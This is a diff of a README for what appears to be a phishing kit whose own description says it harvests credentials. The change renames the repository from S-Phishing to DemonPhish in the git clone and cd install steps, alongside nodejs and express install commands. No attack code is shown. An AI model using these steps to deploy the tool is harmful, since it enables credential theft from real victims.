@@ -15,9 +15,9 @@ This is a tool made in HTML, CSS and JavaScript which harvests the credentials o
 ## Installing and requirements
 sudo apt install nodejs npm -y
 
-git clone https://github.com/r3b00tm4st3r/S-Phishing.git
+git clone https://github.com/r3b00tm4st3r/DemonPhish.git
 
-cd S-Phishing
+cd DemonPhish
 
 npm install express
 
